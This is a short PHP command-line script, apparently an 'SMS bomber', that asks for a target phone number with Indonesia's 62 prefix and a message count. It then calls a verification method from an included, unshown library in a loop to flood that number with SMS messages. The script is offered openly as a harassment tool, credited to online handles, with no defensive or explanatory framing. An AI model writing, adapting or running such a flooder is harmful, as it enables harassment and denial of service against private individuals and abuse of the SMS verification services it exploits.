<?php

include 'bomphd.php';

/*

https://github.com/nee48/BomSmsPhD

Made by X-Random1971

Modified by M4F14_9R3Y-H4T

*/

$init = new Bom();

//Eksekusi Sms Boomber

echo "Nomor Target (pakai 62): ";

$a = trim(fgets(STDIN));

$init->no = "$a";

echo "Jumlah Pesan: ";

$b = trim(fgets(STDIN));

$loop = "$b";

for ($i=0; $i < $loop; $i++) {

$init->Verif($init->no);

}

